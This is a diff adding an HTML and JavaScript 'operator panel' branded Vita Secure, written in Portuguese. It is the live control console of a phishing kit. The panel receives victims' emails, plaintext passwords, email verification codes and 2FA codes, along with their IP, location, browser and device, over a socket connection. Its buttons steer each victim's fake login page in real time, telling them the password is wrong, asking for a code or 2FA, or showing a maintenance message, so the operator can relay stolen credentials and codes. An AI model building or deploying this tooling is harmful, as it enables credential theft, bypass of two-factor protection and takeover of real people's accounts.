@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Operator Dashboard · Vita Secure</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #0a0c0f; color: #e0e0e0; overflow-x: hidden; }
+        .bg-grid { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.03) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; pointer-events: none; }
+
+        .navbar { position: fixed; top: 0; left: 0; right: 0; background: rgba(10,12,15,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0,255,255,0.2); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
+        .logo-area { display: flex; align-items: center; gap: 12px; }
+        .logo-icon { font-size: 28px; color: #00ffff; filter: drop-shadow(0 0 5px #00ffff); }
+        .logo-text h2 { font-size: 18px; font-weight: 600; color: #fff; }
+        .logo-text p { font-size: 10px; color: #00ffff; font-family: monospace; }
+        .nav-stats { display: flex; gap: 12px; flex-wrap: wrap; }
+        .stat-badge { display: flex; align-items: center; gap: 6px; background: rgba(0,255,255,0.05); padding: 6px 12px; border-radius: 20px; border: 1px solid rgba(0,255,255,0.15); font-size: 11px; }
+        .stat-badge i { color: #00ffff; font-size: 10px; }
+        .stat-badge span { font-family: monospace; }
+        .user-menu { display: flex; align-items: center; gap: 12px; }
+        .user-avatar { width: 36px; height: 36px; background: linear-gradient(135deg, #00aaff, #00ffff); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #0a0c0f; font-size: 13px; }
+        .logout-btn { background: rgba(255,68,68,0.15); border: 1px solid rgba(255,68,68,0.3); color: #ff6666; padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 12px; transition: 0.2s; }
+        .logout-btn:hover { background: rgba(255,68,68,0.25); }
+
+        .main-content { position: relative; z-index: 1; margin-top: 80px; padding: 24px; max-width: 1400px; margin-left: auto; margin-right: auto; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
+        .stat-card { background: rgba(20,25,35,0.8); backdrop-filter: blur(8px); border: 1px solid rgba(0,255,255,0.15); border-radius: 12px; padding: 14px; }
+        .stat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
+        .stat-header i { font-size: 18px; color: #00ffff; opacity: 0.7; }
+        .stat-value { font-size: 22px; font-weight: 700; color: #fff; font-family: monospace; }
+        .stat-label { font-size: 9px; color: #8a8f9e; text-transform: uppercase; letter-spacing: 1px; }
+
+        .connection-status { background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; padding: 8px 16px; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; font-size: 12px; }
+        .connection-status.disconnected { background: rgba(255,68,68,0.1); border-color: rgba(255,68,68,0.3); }
+        .status-dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; animation: pulse 1.5s infinite; }
+        .disconnected .status-dot { background: #ff4444; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+        .tabs { display: flex; gap: 6px; margin-bottom: 16px; flex-wrap: wrap; }
+        .tab-btn { background: transparent; border: 1px solid rgba(0,255,255,0.15); color: #8a8f9e; padding: 7px 16px; border-radius: 8px; cursor: pointer; font-size: 11px; transition: 0.2s; }
+        .tab-btn.active { background: rgba(0,255,255,0.1); color: #00ffff; border-color: rgba(0,255,255,0.4); }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .requests-grid { display: grid; gap: 12px; }
+
+        .request-card { background: rgba(20,25,35,0.8); backdrop-filter: blur(8px); border: 1px solid rgba(0,255,255,0.15); border-radius: 16px; padding: 20px; animation: slideIn 0.3s ease-out; position: relative; }
+        .request-card:hover { border-color: rgba(0,255,255,0.4); box-shadow: 0 0 20px rgba(0,255,255,0.05); }
+        .request-card.updated { animation: flash 0.5s; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes flash { 0%{border-color:#00ffff;box-shadow:0 0 20px rgba(0,255,255,0.3)} 100%{border-color:rgba(0,255,255,0.15);box-shadow:none} }
+
+        .request-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-wrap: wrap; gap: 8px; }
+        .request-header h3 { color: #fff; font-size: 14px; display: flex; align-items: center; gap: 8px; }
+        .request-time { font-size: 10px; color: #4a4f5e; font-family: monospace; }
+        .request-type { font-size: 9px; padding: 2px 8px; border-radius: 10px; font-weight: 600; text-transform: uppercase; }
+        .request-type.login { background: rgba(0,255,255,0.15); color: #00ffff; }
+        .request-type.code { background: rgba(255,170,0,0.15); color: #ffaa00; }
+        .request-type.2fa { background: rgba(156,39,176,0.15); color: #9c27b0; }
+        .attempt-badge { background: rgba(255,68,68,0.2); color: #ff6666; font-size: 9px; padding: 2px 8px; border-radius: 10px; margin-left: 6px; }
+
+        .request-details { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 8px; margin-bottom: 14px; }
+        .detail-item { background: rgba(0,0,0,0.3); padding: 8px 12px; border-radius: 8px; }
+        .detail-label { font-size: 8px; color: #8a8f9e; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px; }
+        .detail-value { font-size: 12px; color: #e0e0e0; font-family: monospace; word-break: break-all; }
+        .detail-value.password { letter-spacing: 2px; color: #ffaa00; }
+        .detail-value.code { font-size: 20px; letter-spacing: 6px; color: #00ff88; font-weight: 700; }
+        .detail-value.code-2fa { font-size: 20px; letter-spacing: 6px; color: #9c27b0; font-weight: 700; }
+
+        .action-buttons { display: flex; flex-wrap: wrap; gap: 6px; }
+        .btn { padding: 8px 12px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 11px; border: none; transition: 0.2s; text-align: center; white-space: nowrap; }
+        .btn-approve { background: rgba(0,255,136,0.15); border: 1px solid rgba(0,255,136,0.3); color: #00ff88; }
+        .btn-approve:hover { background: rgba(0,255,136,0.3); box-shadow: 0 0 15px rgba(0,255,136,0.2); }
+        .btn-code { background: rgba(0,170,255,0.15); border: 1px solid rgba(0,170,255,0.3); color: #00aaff; }
+        .btn-code:hover { background: rgba(0,170,255,0.3); box-shadow: 0 0 15px rgba(0,170,255,0.2); }
+        .btn-2fa { background: rgba(156,39,176,0.15); border: 1px solid rgba(156,39,176,0.3); color: #9c27b0; }
+        .btn-2fa:hover { background: rgba(156,39,176,0.3); box-shadow: 0 0 15px rgba(156,39,176,0.2); }
+        .btn-reject { background: rgba(255,68,68,0.15); border: 1px solid rgba(255,68,68,0.3); color: #ff6666; }
+        .btn-reject:hover { background: rgba(255,68,68,0.3); box-shadow: 0 0 15px rgba(255,68,68,0.2); }
+        .btn-maintenance { background: rgba(255,170,0,0.15); border: 1px solid rgba(255,170,0,0.3); color: #ffaa00; }
+        .btn-maintenance:hover { background: rgba(255,170,0,0.3); box-shadow: 0 0 15px rgba(255,170,0,0.2); }
+        .btn-code-wrong { background: rgba(255,100,0,0.15); border: 1px solid rgba(255,100,0,0.3); color: #ff6400; }
+        .btn-code-wrong:hover { background: rgba(255,100,0,0.3); box-shadow: 0 0 15px rgba(255,100,0,0.2); }
+        .btn-delete { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); color: #6a6f7e; font-size: 10px; padding: 6px 10px; }
+        .btn-delete:hover { background: rgba(255,68,68,0.2); border-color: rgba(255,68,68,0.3); color: #ff6666; }
+
+        .logs-table { width: 100%; background: rgba(20,25,35,0.8); border: 1px solid rgba(0,255,255,0.15); border-radius: 16px; overflow-x: auto; }
+        .logs-table table { width: 100%; border-collapse: collapse; min-width: 900px; }
+        .logs-table th, .logs-table td { padding: 10px 12px; text-align: left; border-bottom: 1px solid rgba(0,255,255,0.08); font-size: 11px; }
+        .logs-table th { color: #00ffff; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; white-space: nowrap; }
+        .logs-table td { font-family: monospace; font-size: 10px; }
+        .log-approved { color: #00ff88; }
+        .log-rejected { color: #ff6666; }
+        .log-code { color: #ffaa00; }
+        .log-2fa { color: #9c27b0; }
+        .log-info { color: #8a8f9e; }
+
+        .empty-state { text-align: center; padding: 60px 20px; color: #4a4f5e; }
+        .empty-state i { font-size: 48px; margin-bottom: 16px; }
+        .empty-state p { font-size: 16px; }
+
+        @media (max-width: 768px) {
+            .nav-stats { display: none; }
+            .action-buttons { flex-direction: column; }
+            .btn { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+
+<nav class="navbar">
+    <div class="logo-area">
+        <i class="fas fa-shield-haltered logo-icon"></i>
+        <div class="logo-text"><h2>VITA SECURE</h2><p>OPERATOR PANEL · v3.0</p></div>
+    </div>
+    <div class="nav-stats">
+        <div class="stat-badge"><i class="fas fa-signal"></i><span id="onlineNow">0 online</span></div>
+        <div class="stat-badge"><i class="fas fa-clock"></i><span id="pendingBadge">0 ativos</span></div>
+        <div class="stat-badge"><i class="fas fa-list"></i><span id="totalBadge">0 hoje</span></div>
+    </div>
+    <div class="user-menu">
+        <div class="user-avatar"><i class="fas fa-user-secret"></i></div>
+        <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> SAIR</button>
+    </div>
+</nav>
+
+<div class="main-content">
+    <div class="connection-status" id="connectionStatus">
+        <div class="status-dot"></div>
+        <span id="connectionText">Conectado ao servidor</span>
+        <span style="margin-left:auto;font-family:monospace;font-size:11px" id="serverTime"></span>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-globe"></i></div><div class="stat-value" id="statOnline">0</div><div class="stat-label">Online</div></div>
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-users"></i></div><div class="stat-value" id="statActive">0</div><div class="stat-label">Cards Ativos</div></div>
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-check-circle"></i></div><div class="stat-value" id="statApproved">0</div><div class="stat-label">Aprovados</div></div>
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-times-circle"></i></div><div class="stat-value" id="statRejected">0</div><div class="stat-label">Recusados</div></div>
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-envelope"></i></div><div class="stat-value" id="statCode">0</div><div class="stat-label">Cód. Email</div></div>
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-shield-alt"></i></div><div class="stat-value" id="stat2fa">0</div><div class="stat-label">2FA</div></div>
+        <div class="stat-card"><div class="stat-header"><i class="fas fa-tools"></i></div><div class="stat-value" id="statMaintenance">0</div><div class="stat-label">Manutenção</div></div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab-btn active" data-tab="active">🟢 ATIVOS (<span id="countActive">0</span>)</button>
+        <button class="tab-btn" data-tab="logs">📋 LOGS</button>
+    </div>
+
+    <div id="activeTab" class="tab-content active">
+        <div class="requests-grid" id="activeGrid">
+            <div class="empty-state"><i class="fas fa-inbox"></i><p>Nenhum cliente ativo no momento</p><p style="font-size:12px;color:#4a4f5e;">Aguardando novas conexões...</p></div>
+        </div>
+    </div>
+
+    <div id="logsTab" class="tab-content">
+        <div class="logs-table">
+            <table>
+                <thead><tr><th>HORA</th><th>TIPO</th><th>EMAIL/CÓDIGO</th><th>SENHA/VALOR</th><th>IP</th><th>PAÍS</th><th>NAVEGADOR</th><th>AÇÃO</th></tr></thead>
+                <tbody id="logsBody"><tr><td colspan="8" style="text-align:center">Nenhum log registrado</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<audio id="alertSound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3" preload="auto"></audio>
+
+<script>
+    const socket = io({ query: { type: 'operator' } });
+    const alertSound = document.getElementById('alertSound');
+
+    let activeRequests = [];
+    let allLogs = [];
+    let onlineClients = 0;
+    let stats = { approved: 0, rejected: 0, codeSent: 0, codeWrong: 0, maintenance: 0, total: 0, twofa: 0 };
+
+    const connectionStatus = document.getElementById('connectionStatus');
+    const connectionText = document.getElementById('connectionText');
+
+    socket.on('connect', () => {
+        connectionStatus.classList.remove('disconnected');
+        connectionText.textContent = 'Conectado ao servidor · Aguardando';
+    });
+    socket.on('disconnect', () => {
+        connectionStatus.classList.add('disconnected');
+        connectionText.textContent = 'Desconectado · Reconectando...';
+    });
+    setInterval(() => { document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('pt-BR'); }, 1000);
+
+    socket.on('current_queue', (data) => {
+        activeRequests = data.activeRequests || [];
+        allLogs = data.logs || [];
+        stats = data.stats || stats;
+        onlineClients = data.online || 0;
+        renderAll();
+    });
+
+    socket.on('new_request', (request) => {
+        const existingIdx = activeRequests.findIndex(r => r.clientSocketId === request.clientSocketId);
+        if (existingIdx !== -1) {
+            activeRequests[existingIdx] = request;
+            const card = document.getElementById(`card-${request.id}`);
+            if (card) { card.classList.add('updated'); setTimeout(() => card.classList.remove('updated'), 600); }
+        } else {
+            request.attempts = request.attempts || 1;
+            activeRequests.push(request);
+            stats.total = (stats.total || 0) + 1;
+            alertSound.currentTime = 0;
+            alertSound.play().catch(() => {});
+        }
+        renderAll();
+    });
+
+    socket.on('new_code_request', (request) => {
+        const existingIdx = activeRequests.findIndex(r => r.clientSocketId === request.clientSocketId);
+        if (existingIdx !== -1) {
+            activeRequests[existingIdx] = request;
+            const card = document.getElementById(`card-${request.id}`);
+            if (card) { card.classList.add('updated'); setTimeout(() => card.classList.remove('updated'), 600); }
+        } else {
+            request.attempts = request.attempts || 1;
+            activeRequests.push(request);
+            stats.total = (stats.total || 0) + 1;
+            alertSound.currentTime = 0;
+            alertSound.play().catch(() => {});
+        }
+        renderAll();
+    });
+
+    socket.on('update_code_request', (request) => {
+        const existingIdx = activeRequests.findIndex(r => r.id === request.id);
+        if (existingIdx !== -1) {
+            activeRequests[existingIdx] = request;
+            const card = document.getElementById(`card-${request.id}`);
+            if (card) { card.classList.add('updated'); setTimeout(() => card.classList.remove('updated'), 600); }
+        }
+        renderAll();
+    });
+
+    socket.on('clients_update', (data) => {
+        onlineClients = data.online;
+        document.getElementById('onlineNow').textContent = onlineClients + ' online';
+        document.getElementById('statOnline').textContent = onlineClients;
+    });
+
+    function renderAll() {
+        updateStats();
+        renderActive();
+        renderLogs();
+    }
+
+    function updateStats() {
+        document.getElementById('pendingBadge').textContent = activeRequests.length + ' ativos';
+        document.getElementById('totalBadge').textContent = (stats.total || 0) + ' hoje';
+        document.getElementById('statOnline').textContent = onlineClients;
+        document.getElementById('statActive').textContent = activeRequests.length;
+        document.getElementById('statApproved').textContent = stats.approved || 0;
+        document.getElementById('statRejected').textContent = (stats.rejected || 0) + (stats.codeWrong || 0);
+        document.getElementById('statCode').textContent = stats.codeSent || 0;
+        document.getElementById('stat2fa').textContent = stats.twofa || 0;
+        document.getElementById('statMaintenance').textContent = stats.maintenance || 0;
+        document.getElementById('countActive').textContent = activeRequests.length;
+        document.getElementById('onlineNow').textContent = onlineClients + ' online';
+    }
+
+    function renderActive() {
+        const grid = document.getElementById('activeGrid');
+        if (activeRequests.length === 0) {
+            grid.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>Nenhum cliente ativo no momento</p><p style="font-size:12px;color:#4a4f5e;">Aguardando novas conexões...</p></div>';
+            return;
+        }
+        grid.innerHTML = activeRequests.map(req => {
+            const isCode = req.type === 'code';
+            const is2FA = req.type === '2fa';
+            const typeLabel = isCode ? 'CÓDIGO' : (is2FA ? '2FA' : 'LOGIN');
+            const typeClass = isCode ? 'code' : (is2FA ? '2fa' : 'login');
+            const attemptLabel = req.attempts > 1 ? `<span class="attempt-badge">Tentativa #${req.attempts}</span>` : '';
+
+            let detailsHTML = '';
+            if (is2FA) {
+                detailsHTML = `
+                    <div class="detail-item" style="grid-column:1/-1"><div class="detail-label">🔐 CÓDIGO 2FA DIGITADO</div><div class="detail-value code-2fa">${req.code || '------'}</div></div>
+                    <div class="detail-item"><div class="detail-label">📧 REFERÊNCIA</div><div class="detail-value">${req.email || 'Autenticador 2FA'}</div></div>
+                    <div class="detail-item"><div class="detail-label">🌍 IP</div><div class="detail-value">${req.ip || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">💻 NAVEGADOR</div><div class="detail-value">${req.browser || 'N/A'}</div></div>
+                `;
+            } else if (isCode) {
+                detailsHTML = `
+                    <div class="detail-item" style="grid-column:1/-1"><div class="detail-label">🔢 CÓDIGO EMAIL DIGITADO</div><div class="detail-value code">${req.code || '------'}</div></div>
+                    <div class="detail-item"><div class="detail-label">📧 EMAIL REFERÊNCIA</div><div class="detail-value">${req.email || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">🌍 IP</div><div class="detail-value">${req.ip || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">💻 NAVEGADOR</div><div class="detail-value">${req.browser || 'N/A'}</div></div>
+                `;
+            } else {
+                detailsHTML = `
+                    <div class="detail-item"><div class="detail-label">🔑 SENHA</div><div class="detail-value password">${req.password || '••••'}</div></div>
+                    <div class="detail-item"><div class="detail-label">🌍 IP</div><div class="detail-value">${req.ip || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">🏳️ PAÍS</div><div class="detail-value">${req.country || 'N/A'} ${req.flag || ''}</div></div>
+                    <div class="detail-item"><div class="detail-label">🏙️ CIDADE</div><div class="detail-value">${req.city || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">💻 NAVEGADOR</div><div class="detail-value">${req.browser || 'N/A'}</div></div>
+                    <div class="detail-item"><div class="detail-label">📱 DISPOSITIVO</div><div class="detail-value">${req.device || 'N/A'}</div></div>
+                `;
+            }
+
+            let buttonsHTML = '';
+            if (is2FA) {
+                buttonsHTML = `
+                    <button class="btn btn-approve" onclick="sendAction('${req.id}', '2fa_approved')">✅ 2FA CORRETO</button>
+                    <button class="btn btn-reject" onclick="sendAction('${req.id}', '2fa_wrong')">❌ 2FA INCORRETO</button>
+                    <button class="btn btn-maintenance" onclick="sendAction('${req.id}', '2fa_maintenance')">🔧 MANUT.</button>
+                    <button class="btn btn-delete" onclick="deleteRequest('${req.id}')">🗑️ APAGAR</button>
+                `;
+            } else if (isCode) {
+                buttonsHTML = `
+                    <button class="btn btn-approve" onclick="sendAction('${req.id}', 'code_approved')">✅ CORRETO</button>
+                    <button class="btn btn-code-wrong" onclick="sendAction('${req.id}', 'code_wrong')">❌ ERRADO</button>
+                    <button class="btn btn-maintenance" onclick="sendAction('${req.id}', 'code_maintenance')">🔧 MANUT.</button>
+                    <button class="btn btn-delete" onclick="deleteRequest('${req.id}')">🗑️ APAGAR</button>
+                `;
+            } else {
+                buttonsHTML = `
+                    <button class="btn btn-approve" onclick="sendAction('${req.id}', 'validate_login')">✅ APROVAR</button>
+                    <button class="btn btn-code" onclick="sendAction('${req.id}', 'send_code_email')">📧 CÓD. EMAIL</button>
+                    <button class="btn btn-2fa" onclick="sendAction('${req.id}', 'send_2fa')">📱 2FA</button>
+                    <button class="btn btn-reject" onclick="sendAction('${req.id}', 'wrong_password')">❌ SENHA INCORRETA</button>
+                    <button class="btn btn-maintenance" onclick="sendAction('${req.id}', 'send_maintenance')">🔧 MANUT.</button>
+                    <button class="btn btn-delete" onclick="deleteRequest('${req.id}')">🗑️ APAGAR</button>
+                `;
+            }
+
+            return `
+                <div class="request-card" id="card-${req.id}">
+                    <div class="request-header">
+                        <h3>
+                            <i class="fas fa-${is2FA ? 'shield-alt' : (isCode ? 'keyboard' : 'user')}"></i> 
+                            ${req.email || 'Código Email'}
+                            ${attemptLabel}
+                        </h3>
+                        <div style="display:flex;align-items:center;gap:8px">
+                            <span class="request-type ${typeClass}">${typeLabel}</span>
+                            <span class="request-time"><i class="far fa-clock"></i> ${req.timestamp}</span>
+                        </div>
+                    </div>
+                    <div class="request-details">${detailsHTML}</div>
+                    <div class="action-buttons">${buttonsHTML}</div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    function renderLogs() {
+        const body = document.getElementById('logsBody');
+        if (allLogs.length === 0) {
+            body.innerHTML = '<tr><td colspan="8" style="text-align:center">Nenhum log registrado</td></tr>';
+            return;
+        }
+        body.innerHTML = [...allLogs].reverse().slice(0, 50).map(log => {
+            let actionClass = 'log-info';
+            if (log.action === 'Aprovado' || log.action === 'Código Correto' || log.action === '2FA Correto') actionClass = 'log-approved';
+            else if (log.action === 'Senha Incorreta' || log.action === 'Código Errado' || log.action === '2FA Incorreto') actionClass = 'log-rejected';
+            else if (log.action === 'Código Email') actionClass = 'log-code';
+            else if (log.action === '2FA Solicitado') actionClass = 'log-2fa';
+            return `<tr>
+                <td>${log.timestamp}</td>
+                <td>${log.type || '---'}</td>
+                <td>${log.email || log.code || '---'}</td>
+                <td>${log.password || '---'}</td>
+                <td>${log.ip}</td>
+                <td>${log.country} ${log.flag || ''}</td>
+                <td>${log.browser}</td>
+                <td class="${actionClass}">${log.action || '---'}</td>
+            </tr>`;
+        }).join('');
+    }
+
+    function sendAction(requestId, action) {
+        socket.emit(action, { requestId });
+    }
+
+    function deleteRequest(requestId) {
+        socket.emit('delete_request', { requestId });
+        const idx = activeRequests.findIndex(r => r.id === requestId);
+        if (idx !== -1) {
+            activeRequests.splice(idx, 1);
+            renderAll();
+        }
+    }
+
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById(btn.dataset.tab + 'Tab').classList.add('active');
+        });
+    });
+
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+        window.location.href = 'painel-login.html';
+    });
+</script>
+</body>
+</html>
